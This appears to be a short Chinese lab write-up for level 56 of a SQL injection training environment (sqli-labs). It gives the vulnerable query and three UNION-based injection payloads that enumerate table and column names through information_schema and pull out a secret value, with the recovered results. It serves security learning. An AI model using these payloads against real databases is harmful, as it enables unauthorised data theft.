---
title: less56
url: https://www.yuque.com/u29002979/ep2zrx/gqdzc8hqn8h4agsb
---

```bash
$sql="SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1";
```

此关闭合方式为'),在十四次之内找到通关密码即可

```bash
爆破数据表 
?id=-1') union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ 
数据表：2f9r4ilh2y

爆破数据字段
 ?id=-1') union select 1,2,group_concat(column_name)from information_schema.columns where table_name='2f9r4ilh2y'--+ 
字段：secret_BL6H

获取密码
?id=-1') union select 1,2,(select secret_BL6H from 2f9r4ilh2y)--+
密码：eOSw9qFmolZQu7VpE0ipHRV4
```
